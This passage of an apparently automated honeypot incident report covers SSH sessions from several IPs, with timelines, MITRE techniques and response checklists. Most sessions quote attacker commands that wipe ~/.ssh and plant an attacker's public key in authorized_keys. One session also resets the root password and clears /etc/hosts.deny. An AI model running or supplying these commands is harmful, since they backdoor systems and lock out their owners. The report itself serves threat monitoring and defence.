| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:47:38` | `cowrie.session.connect` |
| `2026-04-17 06:47:38` | `cowrie.client.version` |
| `2026-04-17 06:47:38` | `cowrie.client.kex` |
| `2026-04-17 06:47:39` | `cowrie.login.success` |
| `2026-04-17 06:47:40` | `cowrie.session.params` |
| `2026-04-17 06:47:40` | `cowrie.command.input` |
| `2026-04-17 06:47:40` | `cowrie.command.failed` |
| `2026-04-17 06:47:40` | `cowrie.log.closed` |
| `2026-04-17 06:47:41` | `cowrie.session.params` |
| `2026-04-17 06:47:41` | `cowrie.command.input` |
| `2026-04-17 06:47:41` | `cowrie.session.file_download` |
| `2026-04-17 06:47:41` | `cowrie.log.closed` |
| `2026-04-17 06:47:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ba919ff8757

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-04-17 06:47 |
| **Last Seen** | 2026-04-17 06:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:47:44` | `cowrie.session.connect` |
| `2026-04-17 06:47:44` | `cowrie.client.version` |
| `2026-04-17 06:47:45` | `cowrie.client.kex` |
| `2026-04-17 06:47:46` | `cowrie.login.success` |
| `2026-04-17 06:47:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dd1609f11fe

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 06:50 |
| **Last Seen** | 2026-04-17 06:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:50:03` | `cowrie.session.connect` |
| `2026-04-17 06:50:03` | `cowrie.client.version` |
| `2026-04-17 06:50:04` | `cowrie.client.kex` |
| `2026-04-17 06:50:04` | `cowrie.login.success` |
| `2026-04-17 06:50:04` | `cowrie.session.params` |
| `2026-04-17 06:50:04` | `cowrie.command.input` |
| `2026-04-17 06:50:04` | `cowrie.command.failed` |
| `2026-04-17 06:50:04` | `cowrie.log.closed` |
| `2026-04-17 06:50:05` | `cowrie.session.params` |
| `2026-04-17 06:50:05` | `cowrie.command.input` |
| `2026-04-17 06:50:05` | `cowrie.session.file_download` |
| `2026-04-17 06:50:05` | `cowrie.log.closed` |
| `2026-04-17 06:50:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b847fd69137

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 06:50 |
| **Last Seen** | 2026-04-17 06:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:50:07` | `cowrie.session.connect` |
| `2026-04-17 06:50:07` | `cowrie.client.version` |
| `2026-04-17 06:50:07` | `cowrie.client.kex` |
| `2026-04-17 06:50:08` | `cowrie.login.success` |
| `2026-04-17 06:50:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63b34e4c632f

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 06:51 |
| **Last Seen** | 2026-04-17 06:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:51:25` | `cowrie.session.connect` |
| `2026-04-17 06:51:25` | `cowrie.client.version` |
| `2026-04-17 06:51:25` | `cowrie.client.kex` |
| `2026-04-17 06:51:26` | `cowrie.login.success` |
| `2026-04-17 06:51:26` | `cowrie.session.params` |
| `2026-04-17 06:51:26` | `cowrie.command.input` |
| `2026-04-17 06:51:26` | `cowrie.command.failed` |
| `2026-04-17 06:51:26` | `cowrie.log.closed` |
| `2026-04-17 06:51:26` | `cowrie.session.params` |
| `2026-04-17 06:51:26` | `cowrie.command.input` |
| `2026-04-17 06:51:27` | `cowrie.session.file_download` |
| `2026-04-17 06:51:27` | `cowrie.log.closed` |
| `2026-04-17 06:51:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19f08181e5ec

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 06:51 |
| **Last Seen** | 2026-04-17 06:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:51:29` | `cowrie.session.connect` |
| `2026-04-17 06:51:29` | `cowrie.client.version` |
| `2026-04-17 06:51:29` | `cowrie.client.kex` |
| `2026-04-17 06:51:29` | `cowrie.login.success` |
| `2026-04-17 06:51:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4529e82f6152

| Field | Detail |
|---|---|
| **Source IP** | `125.77.133[.]94` |
| **First Seen** | 2026-04-17 06:51 |
| **Last Seen** | 2026-04-17 06:51 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:2jmk5FQg2KkD"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:51:30` | `cowrie.session.connect` |
| `2026-04-17 06:51:30` | `cowrie.client.version` |
| `2026-04-17 06:51:30` | `cowrie.client.kex` |
| `2026-04-17 06:51:31` | `cowrie.login.success` |
| `2026-04-17 06:51:32` | `cowrie.session.params` |
| `2026-04-17 06:51:32` | `cowrie.command.input` |
| `2026-04-17 06:51:32` | `cowrie.command.failed` |
| `2026-04-17 06:51:32` | `cowrie.log.closed` |
| `2026-04-17 06:51:32` | `cowrie.session.params` |
| `2026-04-17 06:51:32` | `cowrie.command.input` |
| `2026-04-17 06:51:32` | `cowrie.session.file_download` |
| `2026-04-17 06:51:32` | `cowrie.log.closed` |
| `2026-04-17 06:51:41` | `cowrie.session.params` |
| `2026-04-17 06:51:41` | `cowrie.command.input` |
| `2026-04-17 06:51:41` | `cowrie.log.closed` |
| `2026-04-17 06:51:41` | `cowrie.session.params` |
| `2026-04-17 06:51:41` | `cowrie.command.input` |
| `2026-04-17 06:51:42` | `cowrie.log.closed` |
| `2026-04-17 06:51:42` | `cowrie.session.params` |
| `2026-04-17 06:51:42` | `cowrie.command.input` |
| `2026-04-17 06:51:42` | `cowrie.session.file_download` |
| `2026-04-17 06:51:42` | `cowrie.log.closed` |
| `2026-04-17 06:51:43` | `cowrie.session.params` |
| `2026-04-17 06:51:43` | `cowrie.command.input` |
| `2026-04-17 06:51:43` | `cowrie.log.closed` |
| `2026-04-17 06:51:43` | `cowrie.session.params` |
| `2026-04-17 06:51:43` | `cowrie.command.input` |
| `2026-04-17 06:51:44` | `cowrie.log.closed` |
| `2026-04-17 06:51:44` | `cowrie.session.params` |
| `2026-04-17 06:51:44` | `cowrie.command.input` |
| `2026-04-17 06:51:44` | `cowrie.command.input` |
| `2026-04-17 06:51:44` | `cowrie.log.closed` |
| `2026-04-17 06:51:45` | `cowrie.session.params` |
| `2026-04-17 06:51:45` | `cowrie.command.input` |
| `2026-04-17 06:51:45` | `cowrie.log.closed` |
| `2026-04-17 06:51:45` | `cowrie.session.params` |
| `2026-04-17 06:51:45` | `cowrie.command.input` |
| `2026-04-17 06:51:45` | `cowrie.log.closed` |
| `2026-04-17 06:51:46` | `cowrie.session.params` |
| `2026-04-17 06:51:46` | `cowrie.command.input` |
| `2026-04-17 06:51:46` | `cowrie.log.closed` |
| `2026-04-17 06:51:47` | `cowrie.session.params` |
| `2026-04-17 06:51:47` | `cowrie.command.input` |
| `2026-04-17 06:51:47` | `cowrie.log.closed` |
| `2026-04-17 06:51:47` | `cowrie.session.params` |
| `2026-04-17 06:51:47` | `cowrie.command.input` |
| `2026-04-17 06:51:47` | `cowrie.log.closed` |
| `2026-04-17 06:51:48` | `cowrie.session.params` |
| `2026-04-17 06:51:48` | `cowrie.command.input` |
| `2026-04-17 06:51:48` | `cowrie.log.closed` |
| `2026-04-17 06:51:48` | `cowrie.session.params` |
| `2026-04-17 06:51:48` | `cowrie.command.input` |
| `2026-04-17 06:51:49` | `cowrie.log.closed` |
| `2026-04-17 06:51:49` | `cowrie.session.params` |
| `2026-04-17 06:51:49` | `cowrie.command.input` |
| `2026-04-17 06:51:49` | `cowrie.log.closed` |
| `2026-04-17 06:51:50` | `cowrie.session.params` |
| `2026-04-17 06:51:50` | `cowrie.command.input` |
| `2026-04-17 06:51:50` | `cowrie.log.closed` |
| `2026-04-17 06:51:50` | `cowrie.session.params` |
| `2026-04-17 06:51:50` | `cowrie.command.input` |
| `2026-04-17 06:51:50` | `cowrie.log.closed` |
| `2026-04-17 06:51:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.77.133[.]94` to AbuseIPDB if not already reported
- [ ] Block `125.77.133[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e3814dc61ee

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 06:52 |
| **Last Seen** | 2026-04-17 06:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:52:45` | `cowrie.session.connect` |
| `2026-04-17 06:52:45` | `cowrie.client.version` |
| `2026-04-17 06:52:45` | `cowrie.client.kex` |
| `2026-04-17 06:52:46` | `cowrie.login.success` |
| `2026-04-17 06:52:46` | `cowrie.session.params` |
| `2026-04-17 06:52:46` | `cowrie.command.input` |
| `2026-04-17 06:52:46` | `cowrie.command.failed` |
| `2026-04-17 06:52:46` | `cowrie.log.closed` |
| `2026-04-17 06:52:47` | `cowrie.session.params` |
| `2026-04-17 06:52:47` | `cowrie.command.input` |
| `2026-04-17 06:52:47` | `cowrie.session.file_download` |
| `2026-04-17 06:52:47` | `cowrie.log.closed` |
| `2026-04-17 06:52:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70a8ded559d1

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 06:52 |
| **Last Seen** | 2026-04-17 06:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:52:49` | `cowrie.session.connect` |
| `2026-04-17 06:52:49` | `cowrie.client.version` |
| `2026-04-17 06:52:49` | `cowrie.client.kex` |
| `2026-04-17 06:52:49` | `cowrie.login.success` |
| `2026-04-17 06:52:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1c493a3eb23

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 06:54 |
| **Last Seen** | 2026-04-17 06:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:54:03` | `cowrie.session.connect` |
| `2026-04-17 06:54:03` | `cowrie.client.version` |
| `2026-04-17 06:54:04` | `cowrie.client.kex` |
| `2026-04-17 06:54:04` | `cowrie.login.success` |
| `2026-04-17 06:54:04` | `cowrie.session.params` |
| `2026-04-17 06:54:04` | `cowrie.command.input` |
| `2026-04-17 06:54:04` | `cowrie.command.failed` |
| `2026-04-17 06:54:05` | `cowrie.log.closed` |
| `2026-04-17 06:54:05` | `cowrie.session.params` |
| `2026-04-17 06:54:05` | `cowrie.command.input` |
| `2026-04-17 06:54:05` | `cowrie.session.file_download` |
| `2026-04-17 06:54:05` | `cowrie.log.closed` |
| `2026-04-17 06:54:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfcfd3776582

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 06:54 |
| **Last Seen** | 2026-04-17 06:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:54:07` | `cowrie.session.connect` |
| `2026-04-17 06:54:07` | `cowrie.client.version` |
| `2026-04-17 06:54:07` | `cowrie.client.kex` |
| `2026-04-17 06:54:08` | `cowrie.login.success` |
| `2026-04-17 06:54:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12a2d38f6b98

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 06:55 |
| **Last Seen** | 2026-04-17 06:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:55:21` | `cowrie.session.connect` |
| `2026-04-17 06:55:21` | `cowrie.client.version` |
| `2026-04-17 06:55:21` | `cowrie.client.kex` |
| `2026-04-17 06:55:21` | `cowrie.login.success` |
| `2026-04-17 06:55:22` | `cowrie.session.params` |
| `2026-04-17 06:55:22` | `cowrie.command.input` |
| `2026-04-17 06:55:22` | `cowrie.command.failed` |
| `2026-04-17 06:55:22` | `cowrie.log.closed` |
| `2026-04-17 06:55:22` | `cowrie.session.params` |
| `2026-04-17 06:55:22` | `cowrie.command.input` |
| `2026-04-17 06:55:22` | `cowrie.session.file_download` |
| `2026-04-17 06:55:22` | `cowrie.log.closed` |
| `2026-04-17 06:55:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b67b383ebf5

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 06:55 |
| **Last Seen** | 2026-04-17 06:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:55:24` | `cowrie.session.connect` |
| `2026-04-17 06:55:24` | `cowrie.client.version` |
| `2026-04-17 06:55:24` | `cowrie.client.kex` |
| `2026-04-17 06:55:25` | `cowrie.login.success` |
| `2026-04-17 06:55:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c34283c058da

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 06:56 |
| **Last Seen** | 2026-04-17 06:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:56:40` | `cowrie.session.connect` |
| `2026-04-17 06:56:40` | `cowrie.client.version` |
| `2026-04-17 06:56:40` | `cowrie.client.kex` |
| `2026-04-17 06:56:41` | `cowrie.login.success` |
| `2026-04-17 06:56:41` | `cowrie.session.params` |
| `2026-04-17 06:56:41` | `cowrie.command.input` |
| `2026-04-17 06:56:41` | `cowrie.command.failed` |
| `2026-04-17 06:56:41` | `cowrie.log.closed` |
| `2026-04-17 06:56:42` | `cowrie.session.params` |
| `2026-04-17 06:56:42` | `cowrie.command.input` |
| `2026-04-17 06:56:42` | `cowrie.session.file_download` |
| `2026-04-17 06:56:42` | `cowrie.log.closed` |
| `2026-04-17 06:56:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-609e96f785ac

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 06:56 |
| **Last Seen** | 2026-04-17 06:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
